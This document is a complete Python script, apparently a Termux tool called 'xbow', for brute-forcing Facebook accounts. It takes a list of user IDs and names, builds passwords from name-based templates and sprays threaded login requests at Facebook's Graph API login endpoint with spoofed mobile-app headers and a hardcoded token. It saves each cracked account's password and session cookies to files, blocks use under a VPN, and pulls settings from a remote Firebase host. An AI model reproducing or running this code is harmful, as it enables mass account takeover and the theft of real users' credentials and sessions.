import os, zlib
from os import system as osRUB
from os import system as cmd
import subprocess
import sys
import socket
import time


os.system('clear')
print(f'Loading Tool...')

def start_session_blocker():
    subprocess.Popen(["nohup", "python", "session_blocker.py", "&"])

# Call the function to start the session blocker
start_session_blocker()


try:
    import psutil
except ModuleNotFoundError:
    subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import psutil

def check_vpn():
    vpn_interfaces = ['tun', 'ppp', 'utun']
    for interface in psutil.net_if_addrs():
        if any(vpn in interface.lower() for vpn in vpn_interfaces):
            print("Turn Off VPN")
            sys.exit(1)

def check_network():
    try:
        socket.create_connection(('8.8.8.8', 53), timeout=5)
    except (socket.timeout, socket.gaierror, socket.error):
        print("Network connection error!")
        sys.exit(1)


def reinstall_modules(modules):
    subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y"] + modules, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
      subprocess.run([sys.executable, "-m", "pip", "install"] + modules, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
      import requests
    except ModuleNotFoundError:
      print("Network connection error!")
      sys.exit(1)   
modules = ["requests", "chardet", "urllib3", "idna", "certifi"]


check_vpn()
check_network()
reinstall_modules(modules)
time.sleep(1)
check_vpn()
check_network()


import requests

try:
    import rich
except:
    os.system("pip install rich")
    import rich

from rich.progress import track


def looood(MACHINE):
    for i in track(range(500), description=MACHINE):
        time.sleep(0.01)


from urllib.request import Request, urlopen
import os, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, re, json, uuid, \
    subprocess, shutil, webbrowser, time, json, sys, random, datetime, time, re, subprocess, platform, string, json, \
    time, re, random, sys, string, uuid
from concurrent.futures import ThreadPoolExecutor as inc3
from string import *
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress
import os, platform
from concurrent.futures import ThreadPoolExecutor


fast_work = ThreadPoolExecutor(max_workers=15).submit
# __________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop, ok, cp, user = 0, [], [], []
cok, plist = [], []


# ━━━━━━━━━━━[ FILE-UA] ━━━━━━━━━━━

def S1():
    en = random.choice(['en_US', 'en_GB', 'en_PK', 'ru_RU', 'de_DE', 'en_BD', 'en_IN', 'en_AF'])
    application_version = str(random.randint(111, 444)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(
        random.randint(11, 33))
    ver = str(random.randrange(30, 443))
    app_version = str(random.randint(111, 444)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(
        random.randint(11, 33))
    app_ver_code = str(random.randint(000000000, 999999999))
    application_version_code = str(random.randint(111111111, 999999999))
    fbap = random.choice(
        ['414.0.0.30.113', '398.0.0.21.105', '274.0.0.22.117', '316.4.0.15.120', '385.0.0.32.114', '415.0.0.34.107',
         '414.0.0.30.113', '357.0.0.13.112', '415.0.0.34.107', '408.1.0.16.113', '412.0.0.22.115', '240.0.0.38.121',
         '414.0.0.30.113', '241.0.0.43.15'])
    fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
    s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(
        random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
    e = '[Dalvik/2.1.0 (Linux; U; Android 12; vivo 1938 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243062;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBDV/vivo 1938;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1411};FB_FW/1;]'
    ua = e
    # print(ua)
    return ua


fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/e_value.json"

def get_ua():
    try:
        response = requests.get(fu, timeout=5)
        if response.status_code == 200:
            return response.text.strip().replace('"', '')
        else:
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        sys.exit(1)

e = get_ua()

def user_agent():
    s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(
        random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
    if not e:
        sys.exit(1)
    ua = s + e
    return ua

# ━━━━━━━━━━━[ Version] ━━━━━━━━━━━

fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/ver.json"

def ver():
    try:
        response = requests.get(fu, timeout=5)
        if response.status_code == 200:
            return response.text.strip().replace('"', '')
        else:
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        sys.exit(1)
    
v = ver()


# ━━━━━━━━━━━[ Notice] ━━━━━━━━━━━

fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/notice.json"

def Dark():
    try:
        response = requests.get(fu, timeout=5)
        if response.status_code == 200:
            return response.text.strip().replace('"', '')
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass

notice = Dark()    
if notice == "null":
    pass
elif notice:
    os.system('clear')
    print(notice)
    sys.exit(1)

# __________________[ SYS ]__________________#
os.system('git pull')
sys.stdout.write('\x1b]2; xbow \x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'viewport-width': '980'}
# __________________[ COLOUR ]__________________#
A = '\x1b[1;97m';
R = '\x1b[38;5;196m';
Y = '\033[1;33m';
M = '\x1b[38;5;205m';
B = '\x1b[38;5;8m';
G1 = '\x1b[38;5;46m';
G2 = '\x1b[38;5;47m';
G3 = '\x1b[38;5;48m';
G4 = '\x1b[38;5;49m';
G5 = '\x1b[38;5;50m';
X = '\33[1;34m';
X1 = '\x1b[38;5;14m';
X2 = '\x1b[38;5;123m';
X3 = '\x1b[38;5;122m';
X4 = '\x1b[38;5;86m';
X5 = '\x1b[38;5;121m';
S = '\x1b[1;96m';
G = '\x1b[38;5;48m'
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black = "\033[1;30m"
red = "\x1b[38;5;160m"
green = "\x1b[38;5;46m"
yelloww = "\033[1;33m"
blue = "\033[38;5;6m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white, blue, green];
warna = random.choice(my_color)


# __________________[ LINEX ]__________________#
def clear(): os.system('clear');print(logo)


def linex(): print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')


# __________________[ LOGO. ..]__________________#
logo = f"""
{white}X   X BBBB   OOO  W     W
{white} X X  B   B O   O W     W
{white}  X   BBBB  O   O W  W  W
{white} X X  B   B O   O  W W W
{white}X   X BBBB   OOO    W W           {green}{v}
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{white}[{green}◆{white}] {white}FACEBOOK {white}➣{white}   ({green}clone.inception{white})
{white}[{green}◆{white}] {white}GITTEA   {white}➣{white}   ({green}inc3{white})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""


# __________________[ RESULT ]__________________#
def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        print(f'{white}[{green}◆{white}] {white}THE PROCESS HAS BEEN COMPLETED...')
        print(f'{white}[{green}◆{white}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
        print(f'{white}[{green}◆{white}] {green}TOTAL CP {white}➣{red} %s' % str(len(cps)))
        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        input(f"{white}[{green}◆{white}] {white}PRESS ENTER TO BACK MENU ")
        exit()


# __________________[ MENU ]__________________#
def menu():
    clear()
    print(f'[{white}1] {green}START FILE CLONE{white}')
    print(f'[{white}2] JOIN MESSENGER GROUP')
    print(f'[{white}3] CONTACT TOOL AUTHOR')
    print(f'[{white}0] {red}EXIT TOOL  ')
    linex()
    select = input(f'{white}[{green}◆{white}] {white}CHOICE OPTION {white}➣{green} ')
    if select == '1':
        check_vpn()
        folder_name = "/sdcard/XBOW"
        if not os.path.exists(folder_name):
          os.makedirs(folder_name)
        _file_()
    elif select == '2':
        print(f'{red}Not Found{red}')
        time.sleep(2)
        #os.system('xdg-open https://chat.whatsapp.com/Bd8RQc6VoKxLOO9ljc5Raj');
        menu()
    elif select == '3':
        print(f'{red}Not Found{red}')
        time.sleep(2)
        #os.system('xdg-open https://www.facebook.com/MR.xbow.404');
        menu()
    elif select == '0':
        exit(f'{green}[{red}+{green}] See you again ')
    else:
        print(f'{white}[{red}!{white}] INVALID OPTION')
        time.sleep(1)
        menu()


def _file_():
    global methods
    clear()
    print(f'{white}[{red}◆{white}] {white}METHOD - 1')
    print(f'{white}[{green}◆{white}] {white}METHOD - 2')
    linex()
    option = input(f'{white}[{green}◆{white}] {white}CHOICE METHOD {white}➣{green} ')
    if option == '1':
        print(f"{white}[{red}!{white}] Method 1 Coming Soon!")
        time.sleep(2)
        _file_()
    elif option == '2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option == '0':
        _file_()
    else:
        print(f'{white}[{red}!{white}] INVALID METHOD')
        time.sleep(2)
        _file_()


class main_crack():
    def __init__(self):
        self.id = []

    def crack(self, id):
        global methods
        clear()
        print(f'{white}[{green}◆{white}] {white}Input File Path e.g. "/sdcard/1.txt"');
        linex()
        self.file = input(f'{white}[{green}◆{white}]{white} File Path {white}➣{white} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{red}[{red}+{red}] File Not Found ...')
            time.sleep(1)
            os.system('clear')
            print(logo)
            print(f'{red}[{red}+{red}] Input Correct File Path')
            time.sleep(1)
            main_crack().crack(id)

    # __________________[ FILE METHOD M1 ]__________________#
    def methodA(self, sid, name, psw):
        try:
            global oks, cps, loop
            sys.stdout.write(
                f"\r{red}[{green}xbow-M1{red}]{white}-{red}[{gren}{loop}{red}]{white}-{red}[{green}OK{red}]{white}-{red}[{green}{len(oks)}{red}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                              ls).replace(
                    'Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                            "format": "json",
                            "device_id": str(uuid.uuid4()),
                            "cpl": "true",
                            "family_device_id": str(uuid.uuid4()),
                            "credentials_type": "device_based_login_password",
                            "error_detail_type": "button_with_disabled",
                            "source": "device_based_login",
                            "email": sid,
                            "password": ps,
                            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                            "generate_session_cookies": "1",
                            "meta_inf_fbmeta": "",
                            "advertiser_id": str(uuid.uuid4()),
                            "currently_logged_in_userid": "0",
                            "locale": "en_GB",
                            "client_country_code": "GB",
                            "method": "auth.login",
                            "fb_api_req_friendly_name": "authenticate",
                            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                            "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': S1(),
                           'Content-Type': 'application/x-www-form-urlencoded',
                           'Host': 'graph.facebook.com',
                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                           'X-FB-Connection-Type': 'MOBILE.LTE',
                           'X-Tigon-Is-Retry': 'False',
                           'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                           'x-fb-device-group': '5120',
                           'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                           'X-FB-Request-Analytics-Tags': 'graphservice',
                           'X-FB-HTTP-Engine': 'Liger',
                           'X-FB-Client-IP': 'True',
                           'X-FB-Server-Cluster': 'True',
                           'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', }
                q = session.post("https://graph.facebook.com/auth/login", data=data, headers=headers,
                                 allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"]);
                    AJb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/",
                                                                                                               "-");
                    cookie = f"{ckkk}"
                    print(f"\r\r{red}[{green}xbow-OK{red}] {green}{sid} {red}-{green} {ps} ")
                    print(f'\r\r{green}-[🤡]-{white} {cookie}''\n')
                    open('/sdcard/XBOW/xbow-M1-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
                    open('/sdcard/XBOW/xbow--CP.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                else:
                    continue
            loop += 1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
        # __________________[ FILE METHOD M2 ]__________________#

    def methodB(self, sid, name, psw):
        try:
            global oks, cps, loop
            sys.stdout.write(
                f"\r{white}[{white}xbow-M2{white}]{white}-{white}[{white}{loop}{white}]{white}-{white}[{green}OK-{len(oks)}{white}]{white}[{black}CP-{len(cps)}{white}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                              ls).replace(
                    'Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                            "format": "json",
                            "device_id": str(uuid.uuid4()),
                            "cpl": "true",
                            "family_device_id": str(uuid.uuid4()),
                            "credentials_type": "device_based_login_password",
                            "error_detail_type": "button_with_disabled",
                            "source": "device_based_login",
                            "email": sid,
                            "password": ps,
                            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                            "generate_session_cookies": "1",
                            "meta_inf_fbmeta": "",
                            "advertiser_id": str(uuid.uuid4()),
                            "currently_logged_in_userid": "0",
                            "locale": "en_GB",
                            "client_country_code": "GB",
                            "method": "auth.login",
                            "fb_api_req_friendly_name": "authenticate",
                            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                            "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': user_agent(),
                           'Content-Type': 'application/x-www-form-urlencoded',
                           'Host': 'graph.facebook.com',
                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                           'X-FB-Connection-Type': 'MOBILE.LTE',
                           'X-Tigon-Is-Retry': 'False',
                           'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                           'x-fb-device-group': '5120',
                           'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                           'X-FB-Request-Analytics-Tags': 'graphservice',
                           'X-FB-HTTP-Engine': 'Liger',
                           'X-FB-Client-IP': 'True',
                           'X-FB-Server-Cluster': 'True',
                           'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', }
                q = session.post("https://graph.facebook.com/auth/login", data=data, headers=headers,
                                 allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"]);
                    SMILEb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/",
                                                                                                                  "-");
                    cookie = f"{ckkk}"
                    print(f"\r\r{red}[{green}xbow-OK{red}] {green}{sid} {red}-{green} {ps} ")
                    print(f'\r\r{green}-[🤡]-{white} {cookie}''\n')
                    open('/sdcard/XBOW/xbow-M2-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
                    open('/sdcard/XBOW/xbow-CP.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                else:
                    continue
            loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.methodB(sid, name, ps)

        # __________________[ PASSWORD ]__________________#

    def pasw(self):
        pw = []
        clear()
        print(f'{white}[{red}◆{white}] {red}Password Limit Should Be Not Greater Than 20!');
        linex()
        sl = int(input(f'{white}[{green}◆{white}] {white}Input Password Limit {white}➣{white} '))
        clear()
        print(f'{white}[{green}◆{white}] {white}EXAMPLE {white}➣{white} First123/first12/77889900')
        linex()
        if sl == '':
            print(f'{S}[{R}={G5}]{S} PUT LIMIT BETWEEN 1 TO 20')
        elif sl > 20:
            print(f'{G5}[{R}={G5}]{S} Password Limit Should Be Not Greater Than 20!')
        else:
            for sr in range(sl):
                pw.append(input(f'{white}[{green}◆{white}] {white}Password {white}{sr + 1} {white}➣{white} '))
        clear()
        print(f'{white}[{green}◆{white}] {white}TOTAL UID  {white}➣{green} %s ' % len(self.id))
        print(f'{white}[{green}◆{white}] {white}Use Automate {green}(1M/3S){green} {white}Airplane Flow')
        linex()
        check_vpn()
        check_network()
        reinstall_modules(modules)
        check_vpn()
        check_network()
        with inc3(max_workers=90) as NOX:
            for zsb in self.id:
                try:
                    uid, name = zsb.split('|')
                    sz = name.split(' ')
                    if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                        pwx = pw
                    else:
                        pwx = pw
                        if 'methodA' in methods:
                            NOX.submit(self.methodA, uid, name, pwx)
                        elif 'methodB' in methods:
                            NOX.submit(self.methodB, uid, name, pwx)
                        elif 'methodC' in methods:
                            NOX.submit(self.methodC, uid, name, pwx)
                except:
                    pass
        result(oks, cps)


menu()
